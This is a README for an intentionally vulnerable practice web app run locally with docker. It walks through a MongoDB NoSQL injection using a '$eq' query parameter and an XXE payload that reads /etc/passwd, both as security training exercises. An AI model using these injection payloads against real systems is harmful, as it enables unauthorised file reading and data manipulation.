# README
## 1. Setup
You want to start this site by using docker, following command is enough.

```
$ docker compose up
```

than use a browser to access ``http://localhost:8080``

You'll see broken_app page.

## 2. Usage
This site has some vulnerabiliy. Use various techniques to find the vulnerability.

## 3. How to Test for vulnerability
### NoSQL Injection(MongoDB)

1. first, register user.  
http://localhost:8080/mongo/signup.php

2. and then, you can search registerd user.  
http://localhost:8080/mongo/search.php?role=user&name=user

3. You can be able to manipulate the data passed into the $eq operator.You'll see same result for 2.
http://localhost:8080/mongo/search.php?role=user&name[$eq]=user

### XXE Injection
1. Access following url  
http://localhost:8080/xml/xmlSubmit.html

2. Replace following text and submit it.
``` xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<info>
  <item>
    <title>Item1</title>
    <link>&xxe;</link>
  </item>
  <item>
    <title>Item2</title>
    <link>XXE</link>
  </item>
</info>
```

3. You'll see `/etc/passwd` in the `&xxe;` place.